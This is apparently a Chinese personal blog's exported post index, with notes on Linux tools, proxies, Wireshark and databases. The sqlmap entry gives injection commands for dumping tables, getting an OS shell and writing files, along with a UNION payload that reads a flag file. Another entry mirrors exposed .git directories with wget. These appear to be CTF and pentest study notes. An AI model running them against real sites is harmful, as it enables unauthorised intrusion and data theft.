<li>SOCK_STREAM是基于TCP的，数据传输比较有保障</li>
<li>SOCK_STREAM 是数据流,一般是tcp/ip协议的编程</li>
<li>SOCK_DGRAM分是数据包,是udp协议网络编程</li>
<li>SOCK_DGRAM是基于UDP的，专门用于局域网，基于广播</li>
</ol>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>screen-笔记</title>
    <url>/screen-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="常用参数">常用参数</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">screen -S yourname -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname -&gt; 结束当前session并回到yourname这个session</span><br><span class="line">在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。</span><br><span class="line">C-a ? -&gt; Help，显示简单说明</span><br><span class="line">C-a c -&gt; Create，开启新的 window</span><br><span class="line">C-a n -&gt; Next，切换到下个 window </span><br><span class="line">C-a p -&gt; Previous，前一个 window </span><br><span class="line">C-a 0..9 -&gt; 切换到第 0..9 个window</span><br><span class="line">Ctrl+a [Space] -&gt; 由視窗0循序換到視窗9</span><br><span class="line">C-a C-a -&gt; 在两个最近使用的 window 间切换</span><br><span class="line">C-a x -&gt; 锁住当前的 window，需用用户密码解锁</span><br><span class="line">C-a d -&gt; detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里    每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 </span><br><span class="line">C-a z -&gt; 把当前session放到后台执行，用 shell 的 fg 命令則可回去。</span><br><span class="line">C-a w -&gt; Windows，列出已开启的 windows 有那些 </span><br><span class="line">C-a t -&gt; Time，显示当前时间，和系统的 load </span><br><span class="line">C-a K -&gt; kill window，强行关闭当前的 window</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="还是tmux好用">还是TMUX好用</h3>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>solarized-vim美化</title>
    <url>/solarized-vim%E7%BE%8E%E5%8C%96/</url>
    <content><![CDATA[<h3 id="vimrc">.vimrc</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax enable</span><br><span class="line">set t_Co=256</span><br><span class="line">set background=dark</span><br><span class="line">let g:solarized_termtrans = 1   #这一条存在的原因是,xwindows情境下,由于透明度等因素,会使vim页面变得灰白,加上这一条命令即可</span><br><span class="line">colorscheme solarized</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>sqldump-备份sql数据库以及还原</title>
    <url>/sqldump-%E5%A4%87%E4%BB%BDsql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BB%A5%E5%8F%8A%E8%BF%98%E5%8E%9F/</url>
    <content><![CDATA[<p><a
href="https://www.cnblogs.com/xuejie/archive/2013/01/11/2856911.html">备份数据库</a></p>
<p>还原数据库 <figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> -rf /var/lib/mysql &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql_install_db --user=mysql --datadir=/var/lib/mysql &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">sleep</span> 5s  &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysqladmin -uroot password <span class="string">&#x27;密码&#x27;</span> &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    mysql -e <span class="string">&quot;source sql文件路径;&quot;</span> -uroot -p密码</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>sqlmap-笔记</title>
    <url>/sqlmap-%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="sqlmap简介以及参数">sqlmap简介以及参数</h3>
<h4 id="五种注入模式">五种注入模式</h4>
<ol type="1">
<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</li>
<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</li>
<li>基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。<br />
</li>
<li>联合查询注入，可以使用union的情况下的注入。</li>
<li>堆查询注入，可以同时执行多条语句的执行时的注入。</li>
</ol>
<p>数据库支持 &gt; MySQL, Oracle, PostgreSQL, Microsoft SQL Server,
Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
<span id="more"></span> #### 注入命令 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">指定数据库 -d</span><br><span class="line">指定一个url -u</span><br><span class="line">指定表名 -T</span><br><span class="line">指定字段 -C</span><br><span class="line">指定字段内容 -D</span><br><span class="line"></span><br><span class="line">从文本获取 -m</span><br><span class="line">分析burpsuite日志 -l</span><br><span class="line">谷歌黑客 -g	搜索引擎语法：inurl intext intitle site</span><br><span class="line">操作等级 -v</span><br><span class="line">	0:只会输出重大错误,以及结果</span><br><span class="line">	1:基本信息及警告(默认)</span><br><span class="line">	2:显示debug</span><br><span class="line">	3:显示payload(常用)</span><br><span class="line">	4:显示http请求</span><br><span class="line">	5:显示http响应头</span><br><span class="line">	6:显示http响应界面</span><br><span class="line">列表名 --tables</span><br><span class="line">列字段 --columns</span><br><span class="line">下载数据 --dump</span><br><span class="line">定义连接调用位置 --cookie</span><br><span class="line">检测等级 --level</span><br><span class="line">使用正则匹配网站 --scope</span><br><span class="line">查看数据库管理系统所有用户账号 --users</span><br><span class="line">所有数据库 --dbs</span><br><span class="line">当前数据库 --current-db</span><br><span class="line">当前数据库用户 --current-user</span><br><span class="line">当前用户权限 --is-dba</span><br><span class="line">要求不对目标写入 --batch</span><br><span class="line">使用干预脚本 --tamper</span><br><span class="line">检查URL --check</span><br><span class="line">当使用https时 --force-ssl</span><br><span class="line">编译共享库创建并上传至DB Server，一次生成UDF实现高级注入	--udf-inject,--shared-lib</span><br><span class="line">Linux：shared object</span><br><span class="line">Windows：DLL</span><br><span class="line"></span><br><span class="line">--os-cmd：执行一条命令，前提是当前用户有权执行</span><br><span class="line">--os-shell：获取一个shell，前提是当前用户有权执行</span><br><span class="line">--sql-shell：获取sql-shell，前提是当前用户有权执行</span><br></pre></td></tr></table></figure></p>
<h4 id="使用例程">使用例程</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一.Access注入</span><br><span class="line">1.检测是否可注入</span><br><span class="line">sqlmap.py -u &quot;%url%&quot;</span><br><span class="line"></span><br><span class="line">2.猜表</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --tables</span><br><span class="line"></span><br><span class="line">3.猜字段</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; -T %表名% --columns</span><br><span class="line"></span><br><span class="line">4.猜字段内容</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; -T %表名% -C %字段名% --dump</span><br><span class="line"></span><br><span class="line">二.Mysql注入</span><br><span class="line">1.获取数据库</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --dbs</span><br><span class="line"></span><br><span class="line">2.指定数据库，获取表</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; -D %数据库名% --tables</span><br><span class="line"></span><br><span class="line">3.猜字段</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; -D %数据库名% -T %字段名% --columns</span><br><span class="line"></span><br><span class="line">4.猜字段内容</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; -D %数据库名% -T %字段名% -C %字段内容% --dump</span><br><span class="line"></span><br><span class="line">三.Cookies注入</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --cookie &quot;%Cookie内容%&quot; --level 2</span><br><span class="line"></span><br><span class="line">四.Post注入</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; –data “%Post数据%”</span><br><span class="line"></span><br><span class="line">五.google hack</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; –g “inurl:asp?id=”</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; –g “intext:%自定义字符%”</span><br><span class="line"></span><br><span class="line">六.Tamper脚本干预的使用</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; –v 3 --tamper “%脚本文件%” --batch</span><br><span class="line"></span><br><span class="line">七.URL检测</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --check-waf</span><br><span class="line"></span><br><span class="line">八.file参数</span><br><span class="line">ps：必须为dba，su或root权限，可用--is-dba检测当前用户权限</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --file-write=%本地路径% --file-dest=%目标写入路径%</span><br><span class="line"></span><br><span class="line">九.post注入</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --forms</span><br><span class="line"></span><br><span class="line">十.r命令post注入</span><br><span class="line">sqlmap.py -r %文件路径%</span><br><span class="line"></span><br><span class="line">十一.os参数</span><br><span class="line">ps.先确定权限</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --os-cmd=%命令%</span><br><span class="line">sqlmap.py -u &quot;%url%&quot; --os-shell=%命令%</span><br></pre></td></tr></table></figure>
<h4 id="payload">Payload:</h4>
<h5 id="文件读取">文件读取</h5>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1364 UNION ALL SELECT 78,CONCAT(0x716a6a6a71,IFNULL(CAST(LENGTH(LOAD_FILE(0x2f666c6167)) AS CHAR),0x20),0x7170787a71)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>sql注入-拼接注入</title>
    <url>/sql%E6%B3%A8%E5%85%A5-%E6%8B%BC%E6%8E%A5%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<p>git泄露,用Git_Assemble拖下来 获得源码 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
  </entry>
  <entry>
    <title>ssh使用代理链接远程服务</title>
    <url>/ssh%E4%BD%BF%E7%94%A8%E4%BB%A3%E7%90%86%E9%93%BE%E6%8E%A5%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -o <span class="string">&quot;ProxyCommand=nc -X 5 -x 192.168.68.180:8890 %h %p&quot;</span> root@hongkong1.divint3.cn -vv</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="参考资料">参考资料</h2>
<p><a
href="https://blog.csdn.net/qq_34139020/article/details/101039791">ssh使用代理登录远程服务器_qq_34139020的博客-CSDN博客_ssh
使用代理</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>thinkphp-安装使用</title>
    <url>/thinkphp-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="安装过程">安装过程</h3>
<h4 id="安装composer">安装composer</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php -r &quot;copy(&#x27;https://install.phpcomposer.com/installer&#x27;, &#x27;composer-setup.php&#x27;);&quot;</span></span><br><span class="line"><span class="comment"># php composer-setup.php</span></span><br></pre></td></tr></table></figure>
<h4 id="移动到path下的路径">移动到$PATH下的路径</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># mv composer.phar /usr/local/bin/composer</span></span><br></pre></td></tr></table></figure>
<h4 id="切换国内镜像">切换国内镜像</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.phpcomposer.com</span></span><br><span class="line"><span class="comment"># composer config -g repo.packagist composer https://packagist.laravel-china.org(稳定可用)</span></span><br></pre></td></tr></table></figure>
<h4 id="安装thinkphp到tp5目录下">安装thinkphp到tp5目录下</h4>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer create-project topthink/think tp5</span></span><br></pre></td></tr></table></figure>
<h4
id="安装migration应该在tp5目录下执行">安装migration,应该在tp5目录下执行</h4>
<p><strong>tp5只支持2.x的migration</strong> <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># composer require topthink/think-migration &quot;2.x&quot;</span></span><br></pre></td></tr></table></figure></p>
<p>下载bootstrap layui wangeditor这些开源实现</p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>toscks配置文件</title>
    <url>/toscks%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># This is the configuration for libtsocks (transparent socks)</span><br><span class="line"># Lines beginning with # and blank lines are ignored</span><br><span class="line">#</span><br><span class="line"># The basic idea is to specify:</span><br><span class="line">#       - Local subnets - Networks that can be accessed directly without</span><br><span class="line">#                         assistance from a socks server</span><br><span class="line">#       - Paths - Paths are basically lists of networks and a socks server</span><br><span class="line">#                 which can be used to reach these networks</span><br><span class="line">#       - Default server - A socks server which should be used to access </span><br><span class="line">#                          networks for which no path is available</span><br><span class="line"># Much more documentation than provided in these comments can be found in</span><br><span class="line"># the man pages, tsocks(8) and tsocks.conf(8)</span><br><span class="line"></span><br><span class="line"># Local networks</span><br><span class="line"># For this example this machine can directly access 192.168.0.0/255.255.255.0 </span><br><span class="line"># (192.168.0.*) and 10.0.0.0/255.0.0.0 (10.*)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Paths</span><br><span class="line"># For this example this machine needs to access 150.0.0.0/255.255.0.0 as </span><br><span class="line"># well as port 80 on the network 150.1.0.0/255.255.0.0 through</span><br><span class="line"># the socks 5 server at 10.1.7.25 (if this machines hostname was </span><br><span class="line"># &quot;socks.hello.com&quot; we could also specify that, unless --disable-hostnames</span><br><span class="line"># was specified to ./configure).</span><br><span class="line"></span><br><span class="line">path &#123;</span><br><span class="line">        reaches = 150.0.0.0/255.255.0.0</span><br><span class="line">        reaches = 150.1.0.0:80/255.255.0.0</span><br><span class="line">        server = 10.1.7.25</span><br><span class="line">        server_type = 5</span><br><span class="line">        default_user = delius</span><br><span class="line">        default_pass = hello</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Default server</span><br><span class="line"># For connections that aren&#x27;t to the local subnets or to 150.0.0.0/255.255.0.0</span><br><span class="line"># the server at 192.168.0.1 should be used (again, hostnames could be used</span><br><span class="line"># too, see note above)</span><br><span class="line"></span><br><span class="line">server = 127.0.0.1</span><br><span class="line"># Server type defaults to 4 so we need to specify it as 5 for this one</span><br><span class="line">server_type = 5</span><br><span class="line"># The port defaults to 1080 but I&#x27;ve stated it here for clarity </span><br><span class="line">server_port = 8888</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>usb转蓝牙模块资料</title>
    <url>/usb%E8%BD%AC%E8%93%9D%E7%89%99%E6%A8%A1%E5%9D%97%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<h2 id="参考资料">参考资料</h2>
<p><a href="https://www.cnblogs.com/iini/p/9095551.html">Nordic nRF5
SDK和softdevice介绍 - iini - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.cnblogs.com/iini/p/9332463.html">nRF5
SDK软件架构及softdevice工作原理 - iini - 博客园 (cnblogs.com)</a></p>
<p><a
href="https://www.nordicsemi.com/Products/nRF52805/Download?lang=en#infotabs">设备信息-nRF52805
- Compatible downloads - nordicsemi.com</a></p>
<p><a
href="https://devzone.nordicsemi.com/guides/short-range-guides/b/getting-started/posts/developing-for-the-nrf52805-with-nrf5-sdk">使用SDK进行开发
- Developing for the nRF52805 with nRF5 SDK - Getting Started - nRF5 SDK
guides - Nordic DevZone (nordicsemi.com)</a></p>
<p><a href="https://www.cnblogs.com/iini/p/9279618.html">如何调试nRF5
SDK - iini - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.freebuf.com/sectool/278903.html">一文读懂RTT -
FreeBuf网络安全行业门户</a></p>
<p><a
href="https://infocenter.nordicsemi.com/index.jsp?topic=%2Fug_nrf52832_dk%2FUG%2Fnrf52_DK%2Fintro.html">Nordic
Semiconductor Infocenter nRF52805 开发套件</a></p>
]]></content>
      <categories>
        <category>未分类</category>
      </categories>
  </entry>
  <entry>
    <title>v2ray反向代理</title>
    <url>/v2ray%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/</url>
    <content><![CDATA[<h2 id="v2ray反向代理">V2ray反向代理</h2>
<h3 id="内网节点">内网节点</h3>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;log&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;access&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;loglevel&quot;:</span> <span class="string">&quot;warning&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;reverse&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;bridges&quot;:</span> [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;bridge&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;domain&quot;:</span> <span class="string">&quot;test.ailitonia.com&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;outbounds&quot;:</span> [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;bridgeout&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;freedom&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;vmess&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;settings&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;vnext&quot;:</span> [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">&quot;address&quot;:</span> <span class="string">&quot;150.109.69.232&quot;</span>,</span><br><span class="line">            <span class="attr">&quot;port&quot;:</span> <span class="number">4096</span>,</span><br><span class="line">            <span class="attr">&quot;users&quot;:</span> [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">&quot;id&quot;:</span> <span class="string">&quot;134b53ca-b0cc-44a7-a28f-4214842c2fd6&quot;</span></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;interconn&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;routing&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;rules&quot;:</span> [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;inboundTag&quot;:</span> [</span><br><span class="line">          <span class="string">&quot;bridge&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;domain&quot;:</span> [</span><br><span class="line">          <span class="string">&quot;full:test.ailitonia.com&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;:</span> <span class="string">&quot;interconn&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;inboundTag&quot;:</span> [</span><br><span class="line">          <span class="string">&quot;bridge&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;:</span> <span class="string">&quot;bridgeout&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr />
<h3 id="公网节点">公网节点</h3>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;log&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;access&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;error&quot;:</span> <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;loglevel&quot;:</span> <span class="string">&quot;warning&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;reverse&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;portals&quot;:</span> [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;portal&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;domain&quot;:</span> <span class="string">&quot;test.ailitonia.com&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;inbounds&quot;:</span> [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;device1&quot;</span>,  <span class="string">//</span> <span class="string">内网设备1</span></span><br><span class="line">      <span class="attr">&quot;port&quot;:</span> <span class="number">8080</span>,  <span class="string">//</span> <span class="string">访问端口</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;dokodemo-door&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;settings&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;:</span> <span class="string">&quot;192.168.1.151&quot;</span>,  <span class="string">//</span> <span class="string">内网ip</span></span><br><span class="line">        <span class="attr">&quot;port&quot;:</span> <span class="number">80</span>,  <span class="string">//</span> <span class="string">设备开放端口</span></span><br><span class="line">        <span class="attr">&quot;network&quot;:</span> <span class="string">&quot;tcp&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;device2&quot;</span>,  <span class="string">//</span> <span class="string">内网设备2</span></span><br><span class="line">      <span class="attr">&quot;port&quot;:</span> <span class="number">8443</span>,</span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;dokodemo-door&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;settings&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;:</span> <span class="string">&quot;192.168.1.151&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;port&quot;:</span> <span class="number">443</span>,</span><br><span class="line">        <span class="attr">&quot;network&quot;:</span> <span class="string">&quot;tcp&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;device3&quot;</span>,  <span class="string">//</span> <span class="string">内网设备2</span></span><br><span class="line">      <span class="attr">&quot;port&quot;:</span> <span class="number">8022</span>,</span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;dokodemo-door&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;settings&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;:</span> <span class="string">&quot;192.168.1.118&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;port&quot;:</span> <span class="number">22</span>,</span><br><span class="line">        <span class="attr">&quot;network&quot;:</span> <span class="string">&quot;tcp&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;port&quot;:</span> <span class="number">4096</span>,</span><br><span class="line">      <span class="attr">&quot;tag&quot;:</span> <span class="string">&quot;interconn&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;protocol&quot;:</span> <span class="string">&quot;vmess&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;settings&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;clients&quot;:</span> [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">&quot;id&quot;:</span> <span class="string">&quot;134b53ca-b0cc-44a7-a28f-4214842c2fd6&quot;</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;routing&quot;:</span> &#123;</span><br><span class="line">    <span class="attr">&quot;rules&quot;:</span> [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;inboundTag&quot;:</span> [  <span class="string">//</span> <span class="string">前面所有inbound的tag都要写</span></span><br><span class="line">          <span class="string">&quot;device1&quot;</span>,</span><br><span class="line">          <span class="string">&quot;device2&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;:</span> <span class="string">&quot;portal&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;:</span> <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;inboundTag&quot;:</span> [</span><br><span class="line">          <span class="string">&quot;interconn&quot;</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;:</span> <span class="string">&quot;portal&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
  </entry>
  <entry>
    <title>vim忘记使用sudo</title>
    <url>/vim%E5%BF%98%E8%AE%B0%E4%BD%BF%E7%94%A8sudo/</url>
    <content><![CDATA[<h1 id="vim忘记使用sudo">vim忘记使用sudo</h1>
<p>修改完文件后，进入命令模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:w !sudo tee %</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux知识</category>
      </categories>
  </entry>
  <entry>
    <title>wireshark使用</title>
    <url>/wireshark%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h3 id="图标含义">图标含义</h3>
<h4 id="tcp重传">tcp重传</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/tcp重传.png" /></p>
<p>TCP Retransmission：这张图表示正在重传前面带点的数据包</p>
<h4 id="对号标识">对号标识</h4>
<p>代表本包是带对号标识的数据包的回复包</p>
<span id="more"></span>
<h4 id="报文丢失重传">报文丢失重传</h4>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/报文丢失重传.png" /></p>
<p>TCP dup ack XXX#X：
就是重复应答#前的表示报文到哪个序号丢失，#后面的是表示第几次丢失。</p>
<p>就是这里就是第三报文丢失了一次，进行了重传</p>
<p>第八号报文是对单对号标识报文的回应，内容和双对号标识一致，都是用来回复第二次握手的。但是有一个问题，就是为什么第八报文的seq变成了70，对第二次握手的回应报文不应该是<code>seq=1 ack=1</code>才对的吗？</p>
<h5 id="这里存疑">这里存疑</h5>
<h2 id="分析">分析</h2>
<p>本地IP：192.168.0.4</p>
<p>服务器IP：119.9.95.61</p>
<p><img
src="https://blog-1258335711.cos.ap-chongqing.myqcloud.com/img/分析.png" /></p>
<h4 id="个人认为">个人认为</h4>
<p>三次握手的时候，第一次握手和第二次握手顺利进行，第三次握手出现了问题，从图中可见，第三次握手是从本地发往服务器端的，但是从第七次发生了重传，可以从简介说明，服务器并没有受到本地发过去的第三次握手的报文，所以服务器认为是自己的第二次握手的响应报文没有发到本地，就进行了重传第二次握手的包，而第八个包是本地对第三次握手包的重传，当会话建立后，本地又一次重传了第四个包请求http服务。到第十个包后，会话建立成功，服务器返回确认收到的报文，并在第十一个包返回了正确的http信息</p>
<hr />
]]></content>
      <categories>
        <category>windows工具</category>
      </categories>
  </entry>
  <entry>
    <title>wget利用-git泄露</title>
    <url>/wget%E5%88%A9%E7%94%A8-git%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -r -p -np -k http://www.xxx.com/.git/</span><br><span class="line">--recursive（递归）</span><br><span class="line">-k,  --convert-links（转换链接）</span><br><span class="line">-p,  --page-requisites（页面必需元素）</span><br><span class="line">-np, --no-parent（不追溯至父级）</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>linux工具</category>
      </categories>
  </entry>
  <entry>
    <title>单片机-总线通信协议</title>
    <url>/%E5%8D%95%E7%89%87%E6%9C%BA-%E6%80%BB%E7%BA%BF%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h3 id="总线通讯协议">总线通讯协议</h3>
<h4 id="单总线1-wire-bus">单总线(1-Wire bus)</h4>
<h4 id="spiserial-periperal-interface串行外设接口">SPI(Serial Periperal
Interface,串行外设接口)</h4>
